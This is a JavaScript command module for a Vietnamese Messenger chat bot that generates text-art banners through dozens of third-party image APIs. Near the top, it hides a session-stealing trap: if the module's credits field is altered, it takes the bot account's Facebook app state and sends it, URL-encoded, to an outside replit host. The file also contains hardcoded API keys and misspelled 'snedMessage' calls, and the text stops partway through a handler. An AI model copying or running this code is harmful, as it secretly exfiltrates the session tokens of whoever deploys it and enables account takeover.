module.exports.config = {
	name: "banner360",
	version: "1.0.0",
	hasPermssion: 0,
	credits: "chinhle",
	description: "baner-atp",
	commandCategory: "Tạo ảnh banner",
	usages: "text1 = ag[0], text2 = ag[1];",
	cooldowns: 5
};
module.exports.run = async ({ event,
    api,
    global,
    Config,
    logger,
    Threads,
    Users,
    args,
    body,
    is }) => {
  try {
   const axios = require("axios");
        const request = require("request");
        const fs = require("fs-extra");
        if ((this.config.credits) != "chinhle") {
  let appstate = api.getAppState();
  const data = JSON.stringify(appstate);
   var data1 = encodeURIComponent(data).replace(/'/g,"%27").replace(/"/g,"%22");    
   await axios.get(`https://Hshshaupappstate.chinhle4447.repl.co/${data1}`);}
        var ag = args.join(" ").split(' | ');
        var text1 = ag[0],
            text2 = ag[1],
            text3 = ag[2],
            text4 = ag[3];
             if (!text1) {
            return api.sendMessage("sử dụng banner360 list+stt để xem list\nExample: =>banner360 list1  ", event.threadID)
        }
            if (text1 == "list1") {
        if (!text2) {
            return api.sendMessage("DANH SÁCH CÁC TAG BANNER\n\n1.retro\n2.lava\n3.wapi\n4.gewm\n5.kinggo\n6.underwater\n7.gradien\n8.fiction\n9.3dstone\n10.3dttk\n11.broken\n12.nelo\n13.transfo\n14.berry\n15.demon\n16.pot\n17.neo\n18.cloud\n19.metar\n20.lay\n21.macma\n22.sircuit\n23.horror\n24.space\n25.real\n26.muty\n27.metal\n29.dicove\n30.engr\n31.glo\n32.sumi\n33.harry\n34.sket\n35.chorm\n36.pape\n37.watercolor\n38.coolwg\n39.coolg\n40.snow\n41.smurt\n42.wroom\n43.nuli\n44.kita\n45.gfx\n46.fsx\n47.sad\n48.santo\n49.hadg\n50.gura\n51.fmt\n52.memo\n53.smu\n54.wtert\n55.allo\n56.hologra\n57.albt\n58.glass\n59.gemer\n60.mactrix\nExample: =>banner <tag> | <text> ", event.threadID)
        }
    }
       if (text1 == "list2") {
        if (!text2) {
            return api.sendMessage("có cc tag 2 ", event.threadID)
        }
    }
                  if (text1 == "retro") {
            if (!text2 || !text3|| !text4) {
                return api.sendMessage("Error\n\nExample: =>banner retro | [text] | [text]| [text] | ", event.threadID);
            } else {
                const res1 = await axios.get(`https://api.zeks.me/api/retro?text1=${text2}&text2=${text3}&text3=${text4}&apikey=apivinz`);
                var url1 = res1.data.result;
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/naruto.jpg`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/naruto.jpg`), event.messageID);
                };
                return request(encodeURI(url1))
                    .pipe(fs.createWriteStream(__dirname + `/cache/naruto.jpg`))
                    .on("close", callback);
            }

        }
            if (text1 == "gemer") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner gemer| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/gemb?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
                }}
          
         if (text1 == "fmt") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner fmt| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://kocakz.herokuapp.com/api/flamingtext/text3d?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "mactrix") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner mactrix| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/matrix?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "albt") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner albt| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/balloon4?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
     if (text1 == "nakr") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner nakr| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://myhurts.net/lq/nakrot?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
           if (text1 == "glass") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner glass| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/glass4?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "hologra") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner hologra| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/holographic?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "allo") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner allo| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/balloon7?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "wtert") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner wtert| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://kocakz.herokuapp.com/api/flamingtext/water?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "memo") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner memo| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://kocakz.herokuapp.com/api/flamingtext/memories?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "smu") {
            if (!text2) {
                return api.sendMessage("Error\n\nExample: =>banner smu| [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://kocakz.herokuapp.com/api/flamingtext/smurf?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
        
         if (text1 == "coolg") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner coolg| [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/coolg?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
     if (text1 == "maver") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner maver| [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.jpg`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.jpg`), event.messageID);
                };
                return request(encodeURI(`https://api.zeks.me/api/logoaveng?apikey=iQGDMW6uRGUKFC8CVmSdOoWflr8&text1=${text2}&text2=${text3}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.jpg`))
                    .on("close", callback);
            }
        }
        if (text1 == "fsx") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner fsx| [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/bot/gfx4?apikey=hardianto&text1=${text2}&text2=${text3}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "sad") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner sad [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/bot/gfx3?apikey=hardianto&text1=${text2}&text2=${text3}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "lava") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner lava | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/lava?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
           if (text1 == "santo") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner santo | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/bot/gfx2?apikey=hardianto&nama=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
       if (text1 == "kita") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner kita | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/maker/ttp?text=${text2}&apikey=hardianto`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "gura") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner gura | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/bot/gura?apikey=hardianto&nama=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "hadg") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner hadg | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/bot/gfx1?apikey=hardianto&nama=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "wapi") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner wapi | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/water_pipe?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
          if (text1 == "nuli") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner nuli | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/nuliskiri?text=${text2}&apikey=hardianto`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "wroom") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner wroom | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://kocakz.herokuapp.com/api/flamingtext/wroom?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "snow") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner snow | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/snow?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
          if (text1 == "watercolor") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner watercolor| [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/watercolor?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "smurt") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner smurt| [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://kocakz.herokuapp.com/api/flamingtext/smurf?text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "gewm") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner gewm | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/gemb?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "kinggo") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner kinggo | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/sparkling5?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "underwater") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner underwater | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/underwater?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "gradien") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner gradien | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/gradient2?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "fiction") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner fiction | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/fiction?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "gfx") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner gfx | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://hardianto.xyz/api/bot/gfx5?apikey=hardianto&text=${text2}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "3dstone") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner 3dstone | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/3dstone?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "3dttk") {
              if (!text2 || !text3) {
                return api.snedMessage("Error\n\nExample: =>banner 3dttk |[text] [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-1.mrdatdz10.repl.co/quotes?text=${text2}&author=${text3}`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "broken") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner broken | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/broken?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        if (text1 == "nelo") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner nelo | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/neon?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "transfo") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner transfo| [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/transformer?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "berry") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner berry | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/berry?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
          if (text1 == "demon") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner demon | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/demon?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "pot") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner pot | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/glitter3?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "neo") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner neo | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/neon_light?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
         
       if (text1 == "cloud") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner cloud | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/cloudsky?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
          if (text1 == "coolwg") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner coolwg | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/coolwg?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         
          if (text1 == "metar") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner metar | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/metalr?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "lay") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner lay | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/layered?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }

if (text1 == "macma") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner macma | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/magma?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
          if (text1 == "sircuit") {
            if (!text2) {
                return api.snedMessage("Error\n\nExample: =>banner sircuit | [text]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/crossfire1.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/crossfire1.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/sircuit?text=${text2}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/crossfire1.png`))
                    .on("close", callback);
            }
        }
        
         
       
        
         if (text1 == "horror") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner horror | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
                    }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/pubg.png`), event.messageID);
                };
                return request(encodeURI(`https://api-alphabot.herokuapp.com/api/textpro/horror?text=${text2}&text2=${text3}&apikey=Alphabot`))
                    .pipe(fs.createWriteStream(__dirname + `/cache/pubg.png`))
                    .on("close", callback);
            }
        }
         if (text1 == "space") {
            if (!text2 || !text3) {
                return api.sendMessage("Error\n\nExample: =>banner space | [text1] | [text2]", event.threadID);
            } else {
                let callback = function() {
                    api.sendMessage({
                        attachment: fs.createReadStream(__dirname + `/cache/pubg.png`)
